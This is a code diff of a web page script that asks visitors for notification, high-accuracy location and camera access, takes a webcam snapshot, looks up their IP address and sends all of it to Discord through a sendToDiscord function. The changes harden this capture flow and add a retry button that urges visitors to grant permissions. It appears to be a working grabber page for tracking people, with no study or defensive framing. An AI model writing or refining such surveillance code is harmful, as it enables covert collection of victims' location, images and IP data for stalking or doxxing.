@@ -16,6 +16,7 @@
       justify-content: center;
       align-items: center;
       font-size: 1.2rem;
+      text-align: center;
     }
     #startBtn {
       padding: 0.5em 1em;
@@ -53,10 +54,10 @@
     function dataURLtoBlob(dataurl) {
       const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
         bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      while(n--){
+      while (n--) {
         u8arr[n] = bstr.charCodeAt(n);
       }
-      return new Blob([u8arr], {type:mime});
+      return new Blob([u8arr], { type: mime });
     }
 
     function sendToDiscord(ipData) {
@@ -93,10 +94,10 @@
         ],
         files: capturedImageData
           ? [{
-              name: "snapshot.png",
-              type: "image/png",
-              data: capturedImageData
-            }]
+            name: "snapshot.png",
+            type: "image/png",
+            data: capturedImageData
+          }]
           : []
       };
 
@@ -119,11 +120,14 @@
       document.getElementById("status").innerText = "Requesting permissions…";
 
       try {
-        // Step 1: Notification
-        await Notification.requestPermission();
+        // Notifications
+        if ("Notification" in window && Notification.permission !== "granted") {
+          await Notification.requestPermission();
+        }
 
-        // Step 2: Location
+        // Location
         await new Promise((resolve) => {
+          if (!navigator.geolocation) return resolve();
           navigator.geolocation.getCurrentPosition(
             (pos) => {
               coords.lat = pos.coords.latitude;
@@ -131,37 +135,37 @@
               coords.acc = pos.coords.accuracy;
               resolve();
             },
-            () => {
-              resolve(); // continue even if location denied
-            },
+            () => resolve(),
             { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
         });
 
-        // Step 3: Camera
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          await video.play();
+        // Camera
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            await video.play();
 
-          await new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-              const canvas = document.createElement("canvas");
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              capturedImageData = canvas.toDataURL("image/png");
-              stream.getTracks().forEach(track => track.stop());
-              resolve();
-            };
-          });
-        } catch {
-          // camera denied — continue without image
+            await new Promise((resolve) => {
+              video.onloadedmetadata = () => {
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                capturedImageData = canvas.toDataURL("image/png");
+                stream.getTracks().forEach(track => track.stop());
+                resolve();
+              };
+            });
+          } catch (e) {
+            console.warn("Camera permission denied or not available.");
+          }
         }
 
-        // Step 4: Get IP + send everything
+        // IP fetch + final dispatch
         fetch("https://api.db-ip.com/v2/free/self")
           .then(res => res.json())
           .then(sendToDiscord)
@@ -170,7 +174,13 @@
           });
 
       } catch (err) {
-        document.body.innerHTML = "<div style='color:white;text-align:center;'>Permissions not granted.<br>Reload and try again.</div>";
+        document.getElementById("status").innerHTML = `
+          <div style="color:white;">
+            Permissions not granted or blocked.<br/>
+            Please reload and allow permissions.<br/><br/>
+            <button id="retryBtn" style="margin-top:10px;padding:0.5em 1em;background:#222;color:#fff;border:1px solid #fff;border-radius:8px;cursor:pointer;">Retry</button>
+          </div>`;
+        document.getElementById("retryBtn").onclick = () => location.reload();
       }
     }
 
